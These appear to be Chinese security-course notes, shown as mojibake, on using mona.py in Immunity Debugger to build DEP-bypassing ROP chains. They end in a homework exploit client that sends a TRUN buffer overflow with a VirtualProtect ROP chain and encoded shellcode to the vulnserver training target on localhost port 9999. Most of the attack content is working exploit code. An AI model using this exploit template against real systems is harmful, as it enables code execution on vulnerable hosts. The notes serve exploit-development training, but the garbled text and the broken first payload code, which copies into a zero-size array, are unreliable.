![img](./notesimg/1659463284846-8127151d-e49b-40dd-a057-5f9c2ac027c0.png)

-   -   immunity è°ƒè¯•å™¨çš„LOGçª—å£ä¸­è¾“å…¥å‘½ä»¤   !mona rop
    -   ![img](./notesimg/1659463467011-f18239f0-e213-40d0-85ba-d2bc50de23d5.png)
    -   ![img](./notesimg/1638451616493-e7f57c0e-df0a-4242-bba5-f4d6e27b6fa4.png)
    -   æ‰¾å®Œä¹‹åå›åˆ°logçª—å£å¯ä»¥çœ‹ç»“æœ
    -   ![img](./notesimg/1659463695781-f590f88b-c47d-488b-bcf8-7ef2dc013887.png)

-   

-   -   è¾“å…¥!mona æŸ¥çœ‹å¸®åŠ©å‘½ä»¤
    -   ![img](./notesimg/1638451715277-1d06c34f-ec2e-495e-8c7f-e35aeab83e5f.png)
    -   æ—¥å¿—å†™åˆ°æ–‡ä»¶å†…ï¼Œåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ã€‚



##### monaæŸ¥æ‰¾ropé“¾

-   æŒ‡ä»¤ï¼š!mona rop
-   é»˜è®¤å€¼ï¼šé»˜è®¤åœ¨è°ƒè¯•ç¨‹åºå½“å‰æ¨¡å—å’ŒåŠ è½½çš„å¤–éƒ¨ä¸»æ¨¡å—é‡ŒæŸ¥æ‰¾
-   åœ¨æŒ‡å®šæ¨¡å—æŸ¥æ‰¾æŒ‡ä»¤ï¼š

â€‹          `!mona rop -cpb '\x00' -m  ntdll.dll,kernel32.dll,kernelbase.dll`

â€‹          -cpb  æ’é™¤æœ‰æŒ‡å®šåå­—ç¬¦çš„æŒ‡ä»¤         

â€‹          -m     æŒ‡å®šæ¨¡å—

-   ç»“æœï¼šåœ¨å½“å‰ç›®å½•æ–‡ä»¶ä¸‹çš„ï¼Œ rop_*.txt çš„æ–‡ä»¶å¤¹
-   ![img](./notesimg/1638452400587-6864f7ed-a465-41d4-bad4-066c4fd688a2.png)



è§£è¯»charinsæ–‡ä»¶ï¼Œå½“å‡ºç°ä»¥ä¸‹æƒ…å†µæ—¶ï¼Œè¯æ˜æ²¡æ‰¾åˆ°ã€‚å› ä¸ºé»˜è®¤æ˜¯æ‰¾ä¸»æ¨¡å—çš„

-   ![img](./notesimg/1638452510910-f7d9b248-e9d2-4c61-841f-3865a1ee0c3d.png)



ä¿®æ”¹å†…å­˜å±æ€§è§£æ

```c++
int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x7606772d,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x760a1e20,  // ptr to &SetInformationProcess() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x779db640,  // MOV EBP,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x7603e712,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffde,  // Value to negate, will become 0x00000022
      0x76069c08,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x77aacf20,  // XCHG EAX,EDX // RETN [ntdll.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77a17e05,  // POP ECX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x76020212,  // &0x00000002 [KERNEL32.DLL]
      //[---INFO:gadgets_to_set_ebx:---]
      0x77a0928a,  // POP EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x76085012,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xfffffffc,  // Value to negate, will become 0x00000004
      0x76069c08,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edi:---]
      0x77a8c77e,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x77a8c77e,  // skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:pushad:---]  
      //æ‰€æœ‰å¯„å­˜å™¨å…¥æ ˆ,é¡ºåºæ˜¯å›ºå®šçš„,æŠŠæ‰€æœ‰å‚æ•°æ”¾åˆ°å¯„å­˜å™¨,æ—©pushadä¸€æ¬¡æ€§å…¥æ ˆ
      0x779d9519,  // PUSHAD // RETN [ntdll.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }



POP EAX
RETN
MOV EAX,DWORD PTR DS:[EAX]
PUSH EAX
```

1.  é¦–å…ˆå°†éœ€è¦çš„åœ°å€å…¨éƒ¨å­˜æ”¾åœ¨æ ˆé‡Œï¼Œç„¶åæ‰§è¡Œä¸Šè¿°åœ°å€çš„ä»£ç ã€‚

```c++
//ropé“¾   
unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x7606772d,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x760a1e20,  // ptr to &SetInformationProcess() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x779db640,  // MOV EBP,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x7603e712,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xffffffde,  // Value to negate, will become 0x00000022
      0x76069c08,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR     
      0x77aacf20,  // XCHG EAX,EDX // RETN [ntdll.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77a17e05,  // POP ECX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x76020212,  // &0x00000002 [KERNEL32.DLL]
      //[---INFO:gadgets_to_set_ebx:---]
      0x77a0928a,  // POP EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x76085012,  // POP EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0xfffffffc,  // Value to negate, will become 0x00000004
      0x76069c08,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edi:---]
      0x77a8c77e,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
      0x77a8c77e,  // skip 4 bytes [ntdll.dll] ** REBASED ** ASLR
      //[---INFO:pushad:---]
      0x779d9519,  // PUSHAD // RETN [ntdll.dll] ** REBASED ** ASLR 
    };

//å‰é¢çš„å¡«å……ä»£ç 
char  szBuf[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 
};

//å¼¹çª—çš„ shellcode ä»£ç 
char szShellcode[] = {
    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x2C, 0x8D, 0x4D, 0xD4, 0xE8, 0x32, 0x00, 0x00, 0x00, 0x6A, 0x00, 
	0x6A, 0x00, 0x8D, 0x45, 0xF0, 0xC7, 0x45, 0xF0, 0x48, 0x65, 0x6C, 0x6C, 0x50, 0x6A, 0x00, 0xC7, 
	0x45, 0xF4, 0x6F, 0x53, 0x68, 0x65, 0xC7, 0x45, 0xF8, 0x6C, 0x6C, 0x63, 0x6F, 0x66, 0xC7, 0x45, 
	0xFC, 0x64, 0x65, 0xC6, 0x45, 0xFE, 0x00, 0xFF, 0x55, 0xEC, 0x8B, 0xE5, 0x5D, 0xC3, 0xCC, 0xCC, 
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x44, 0x53, 0x56, 0x57, 0x89, 0x4D, 0xF0, 0xC7, 0x45, 0xFC, 0x00, 
	0x00, 0x00, 0x00, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x0C, 0x8B, 
	0x00, 0x8B, 0x00, 0x8B, 0x40, 0x18, 0x89, 0x45, 0xFC, 0x8B, 0x5D, 0xFC, 0x8D, 0x4D, 0xBC, 0xC7, 
	0x45, 0xBC, 0x47, 0x65, 0x74, 0x50, 0xC7, 0x45, 0xC0, 0x72, 0x6F, 0x63, 0x41, 0xC7, 0x45, 0xC4, 
	0x64, 0x64, 0x72, 0x65, 0x8B, 0x43, 0x3C, 0x66, 0xC7, 0x45, 0xC8, 0x73, 0x73, 0xC6, 0x45, 0xCA, 
	0x00, 0x8B, 0x44, 0x18, 0x78, 0x03, 0xC3, 0x89, 0x45, 0xF4, 0x81, 0xF9, 0xFF, 0xFF, 0x00, 0x00, 
	0x76, 0x66, 0x8B, 0x48, 0x18, 0x33, 0xFF, 0x89, 0x4D, 0xF8, 0x85, 0xC9, 0x74, 0x44, 0x8B, 0x70, 
	0x20, 0x03, 0xF3, 0x8B, 0x06, 0x8D, 0x4D, 0xBC, 0x03, 0xC3, 0x8D, 0x9B, 0x00, 0x00, 0x00, 0x00, 
	0x8A, 0x11, 0x3A, 0x10, 0x75, 0x1A, 0x84, 0xD2, 0x74, 0x12, 0x8A, 0x51, 0x01, 0x3A, 0x50, 0x01, 
	0x75, 0x0E, 0x83, 0xC1, 0x02, 0x83, 0xC0, 0x02, 0x84, 0xD2, 0x75, 0xE4, 0x33, 0xC0, 0xEB, 0x05, 
	0x1B, 0xC0, 0x83, 0xC8, 0x01, 0x85, 0xC0, 0x74, 0x0D, 0x47, 0x83, 0xC6, 0x04, 0x3B, 0x7D, 0xF8, 
	0x72, 0xC1, 0x33, 0xC0, 0xEB, 0x28, 0x8B, 0x55, 0xF4, 0x8B, 0x42, 0x24, 0x8D, 0x04, 0x78, 0x0F, 
	0xB7, 0x0C, 0x18, 0x8B, 0x42, 0x1C, 0xEB, 0x0E, 0x8D, 0x4D, 0xBC, 0x2B, 0x48, 0x10, 0x3B, 0x48, 
	0x14, 0x73, 0xDF, 0x8B, 0x40, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x18, 0x03, 0xC3, 0x8B, 0x75, 
	0xF0, 0x8D, 0x4D, 0xCC, 0x51, 0x53, 0xC7, 0x45, 0xCC, 0x4C, 0x6F, 0x61, 0x64, 0x89, 0x06, 0xC7, 
	0x45, 0xD0, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xD4, 0x61, 0x72, 0x79, 0x41, 0xC6, 0x45, 0xD8, 
	0x00, 0xFF, 0xD0, 0x8D, 0x4D, 0xE8, 0x89, 0x46, 0x04, 0x51, 0xC7, 0x45, 0xE8, 0x75, 0x73, 0x65, 
	0x72, 0x66, 0xC7, 0x45, 0xEC, 0x33, 0x32, 0xC6, 0x45, 0xEE, 0x00, 0xFF, 0xD0, 0x8D, 0x4D, 0xDC, 
	0xC7, 0x45, 0xDC, 0x4D, 0x65, 0x73, 0x73, 0x51, 0x50, 0x8B, 0x06, 0xC7, 0x45, 0xE0, 0x61, 0x67, 
	0x65, 0x42, 0xC7, 0x45, 0xE4, 0x6F, 0x78, 0x41, 0x00, 0xFF, 0xD0, 0x5F, 0x89, 0x46, 0x18, 0x5E, 
	0x5B, 0x8B, 0xE5, 0x5D, 0xC3
};

char szPayLoad[]={};

//æ‹¼æ¥æ•°æ®
RtlCopyMemory(szPayLoad,szBuf,sizeof(szBuf));

RtlCopyMemory(szPayLoad+sizeof(szBuf),rop_gadgets,sizeof(rop_gadgets));

RtlCopyMemory(szPayLoad+sizeof(szBuf)+sizeof(rop_gadgets),szShellcode,sizeof(szShellcode));

};

```

![](./notesimg/{3KYQEO7IO]G@5@DTGO988V.png)



è¿™é‡Œåªæ˜¯éœ€è¦äº¤æ¢   eax å’Œ esi çš„å€¼ ï¼Œä½†æ˜¯ä¸‹é¢åˆæŠŠå€¼æ”¹äº†ï¼Œå› æ­¤è¿™æ¡æŒ‡ä»¤éœ€è¦æ¢

 momnaæŸ¥æ‰¾æŒ‡ä»¤ 

!mona  findwild  -s  XCHG  EAX,ESI#*ret

â€‹      \#        éš”å¼€æŒ‡ä»¤

â€‹      \*         é€šé…ç¬¦

â€‹      r32     ä»»æ„å¯„å­˜å™¨

æŸ¥æ‰¾ç»“æœæ–‡ä»¶

FINDWILD.TXT

![image.png](./notesimg/1659465900422-48c286ed-18c7-4d07-9a9f-512c353e3cbb.png)





 ä½œä¸š 

â—å®Œæˆvulnserver.exeçš„å¼¹æ¡†æ“ä½œã€‚vulnserver.exe  ä¹Ÿæ˜¯ä¸€ä¸ªæœåŠ¡å™¨

åè®®   IPPROTO_TCP

![image.png](./notesimg/1659491321237-f2a65128-f38a-44be-97a0-4644405c770a.png)



ç«¯å£å·  0x270f

![image.png](./notesimg/1659493359990-5f6389d4-19a6-47c9-9e37-b02c2a7d82f2.png)



æ¥æ”¶æ•°æ®ç¼“å†²åŒºåœ°å€:   0x714770

![image.png](./notesimg/1659493475931-16421f3c-9a93-4cbc-a326-e130ad75ac93.png)





![image.png](./notesimg/1659495632491-78dc4f6e-2134-4eee-85ee-86f07450cec6.png)





[åˆ†ææ–‡æ¡£.docx(3.2 MB)](./åˆ†ææ–‡æ¡£.docx)

```c++

unsigned char g_szShellCode[] = {
    0x83, 0xEC, 0x10, 0x90, 0xDB, 0xD9, 0xBA, 0xD6, 0xFE, 0x13, 0xA6, 0xD9, 0x74, 0x24, 0xF4, 0x5E, 0x31, 0xC9, 0xB1, 0x45,
    0x83, 0xC6, 0x04, 0x31, 0x56, 0x13, 0x03, 0x80, 0xED, 0xF1, 0x53, 0xF5, 0xF9, 0x6D, 0x42, 0x71,
    0xDA, 0x65, 0x44, 0xAB, 0x90, 0xF1, 0x96, 0x82, 0xB1, 0x76, 0xA9, 0x24, 0xB1, 0xFF, 0x46, 0xCF,
    0xB3, 0xE3, 0xDD, 0x89, 0x33, 0x97, 0x9C, 0x35, 0xCF, 0x91, 0x58, 0x7A, 0xD7, 0xA8, 0x6B, 0xDD,
    0xE6, 0x83, 0x73, 0x3C, 0x88, 0xA8, 0xE0, 0x9A, 0x6D, 0x24, 0xBD, 0xDE, 0xE6, 0x6E, 0x16, 0x66,
    0xF8, 0x64, 0xED, 0xDC, 0xE2, 0xF3, 0xA8, 0xC0, 0x13, 0xEF, 0xAE, 0x34, 0x5D, 0x64, 0x04, 0xBF,
    0x5C, 0x94, 0x54, 0x40, 0x6F, 0xA8, 0x6B, 0x12, 0x14, 0xE8, 0xE0, 0x6D, 0xD4, 0x26, 0x05, 0x70,
    0x11, 0x53, 0xE2, 0x49, 0xE1, 0x80, 0x23, 0xD8, 0xF8, 0x42, 0x69, 0x06, 0xFA, 0xBF, 0xE8, 0xCD,
    0xF0, 0x74, 0x7E, 0x8B, 0x14, 0x8A, 0x6B, 0xA0, 0x21, 0x07, 0x6A, 0x5E, 0xA0, 0x53, 0x49, 0x82,
    0xD2, 0x98, 0x23, 0xB2, 0x3D, 0xCB, 0xCD, 0x27, 0xB4, 0x31, 0xA5, 0x29, 0x89, 0xBB, 0xDA, 0x67,
    0xFE, 0x5B, 0xDD, 0x78, 0x01, 0xEA, 0x67, 0x82, 0x45, 0x93, 0xBF, 0x68, 0xCA, 0xEB, 0x5C, 0x48,
    0x7F, 0x1C, 0xD2, 0x6F, 0x80, 0x23, 0x62, 0xCA, 0x77, 0xB4, 0x19, 0xB8, 0xA7, 0x05, 0x8A, 0x73,
    0x9A, 0xAB, 0x2E, 0x1B, 0xAF, 0xC0, 0xCB, 0xA9, 0x7F, 0xFC, 0x9C, 0x11, 0xA4, 0x08, 0x14, 0x4F,
    0xF2, 0xF3, 0x73, 0x8B, 0x72, 0xC9, 0x2C, 0x28, 0x2C, 0x6C, 0x81, 0xF2, 0xAA, 0x6D, 0x3E, 0x58,
    0x5D, 0xD2, 0xC1, 0xA3, 0x62, 0x85, 0x52, 0x23, 0xC5, 0x76, 0xC5, 0xB2, 0x92, 0x13, 0x57, 0x5C,
    0x10, 0xB9, 0x24, 0xEF, 0x9B, 0x9A, 0x43, 0x53, 0xF8, 0x16, 0xDD, 0x88, 0x68, 0x7F, 0xFD, 0x6E,
    0x49, 0x17, 0xB0, 0x3D, 0xCF, 0xC6, 0x22, 0xB3, 0xA0, 0x65, 0x93, 0x5B, 0x50, 0x5A, 0xF3, 0xFD,
    0xC6, 0xEA, 0x96, 0x6D, 0x7B, 0xDA, 0x91, 0xE5, 0xCF, 0x38, 0x32, 0x7C, 0x2E, 0x71, 0xE0, 0x2C,
    0xE2, 0x23, 0x56, 0x2F, 0xD4, 0xF5, 0x96, 0x9F, 0x2A, 0xA0, 0x1E
};

unsigned int rop_gadgets[] = {
    //[---INFO:gadgets_to_set_esi:---]
    0x76a16ff2,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    0x6250609c,  // ptr to &VirtualProtect() [IAT essfunc.dll]
    0x77033c5e,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [ntdll.dll] ** REBASED ** ASLR 
    0x75b11470,  // XCHG EAX,ESI // RETN [WS2_32.DLL] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_ebp:---]
    0x75ad847d,  // POP EBP // RETN [WS2_32.DLL] ** REBASED ** ASLR 
    0x625011af,  // & jmp esp [essfunc.dll]
    //[---INFO:gadgets_to_set_ebx:---]
    0x760d887f,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
    0xfffffdff,  // Value to negate, will become 0x00000201
    0x76d394ea,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    0x7703cc7e,  // XCHG EAX,EBX // RETN [ntdll.dll] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_edx:---]
    0x769c118d,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    0xffffffc0,  // Value to negate, will become 0x00000040
    0x76d3a918,  // NEG EAX // RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    0x75adc549,  // XCHG EAX,EDX // RETN [WS2_32.DLL] ** REBASED ** ASLR 
    //[---INFO:gadgets_to_set_ecx:---]
    0x760874df,  // POP ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x62504bbe,  // &Writable location [essfunc.dll]
    //[---INFO:gadgets_to_set_edi:---]
    0x77069fec,  // POP EDI // RETN [ntdll.dll] ** REBASED ** ASLR 
    0x76d3a91a,  // RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    //[---INFO:gadgets_to_set_eax:---]
    0x769c1161,  // POP EAX // RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    0x90909090,  // nop
    //[---INFO:pushad:---]
    0x7703ea16,  // PUSHAD // RETN [ntdll.dll] ** REBASED ** ASLR 
};

void SendShellCode(SOCKET sk) {

    char szBuf[4096] = { "TRUN ." };

    for (size_t i = 6; i < sizeof(szBuf); i++)
    {
        szBuf[i] = 0x90;
    }

    szBuf[2012] = 0x12;
    szBuf[2013] = 0x45;
    szBuf[2014] = 0xFA;
    szBuf[2015] = 0x7F;
    memcpy(&szBuf[2012], rop_gadgets, sizeof(rop_gadgets));
    memcpy(&szBuf[2012 + sizeof(rop_gadgets)], g_szShellCode, sizeof(g_szShellCode));

    send(sk, szBuf, sizeof(szBuf), 0);
}
void SendInputData(SOCKET sk) {

    char szSendBuff[32] = { 0 };
    scanf("%31s", szSendBuff);
    send(sk, szSendBuff, sizeof(szSendBuff), 0);
}

int SelectInput(SOCKET sk) {

    int nFlag = 0;
    while (true)
    {
        printf("è¯·é€‰æ‹©ï¼š\r\n0ã€æ¸…ç©ºæ§åˆ¶å°\r\n1ã€é€€å‡º\r\n2ã€å‘é€è¾“å…¥å­—ç¬¦\r\n3ã€å‘é€shellcode\r\n");

        scanf("%d", &nFlag);
        switch (nFlag)
        {
        case 0:
            system("cls");
            break;
        case 1:
            return 0;
        case 2:
            SendInputData(sk);
            return 1;
        case 3:
            SendShellCode(sk);
            return 1;
        default:
            break;
        }
    }
}

int main() {

    SOCKET sk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sk == INVALID_SOCKET)
    {
        printf("socket error\r\n");
        sk = NULL;
        return -1;
    }
    //è¿æ¥IPå’Œç«¯å£
    char szIP[32] = "127.0.0.1";
    sockaddr_in si;
    si.sin_family = AF_INET;
    si.sin_port = htons(9999);
    si.sin_addr.S_un.S_addr = inet_addr(szIP);


    //è¿æ¥æœåŠ¡å™¨
    int nRet = connect(sk, (sockaddr*)&si, sizeof(si));
    if (nRet == INVALID_SOCKET)
    {
        printf("è¿æ¥å¤±è´¥ï¼Œè¯·æ£€æŸ¥è¿œç¨‹æœåŠ¡å™¨æ˜¯å¦å·²ç»æ‰“å¼€");
        closesocket(sk);
        sk = NULL;
        return -1;
    }
    char szBuf[] = { "hello" };

    //send(sk, szBuf, sizeof(szBuf), 0);
    char szRecvBuff[512] = { 0 };
    int nFlag = 1;
    while (true)
    {
        int nRet = recv(sk, szRecvBuff, sizeof(szRecvBuff), 0);
        if (!nRet)
        {
            return -1;
        }
        printf("æœåŠ¡å™¨æ•°æ®ï¼š%s\r\n", szRecvBuff);

        nFlag = SelectInput(sk);
        if (!nFlag)
        {
            return 0;
        }

    }

    closesocket(sk);
    return 0;
}
```

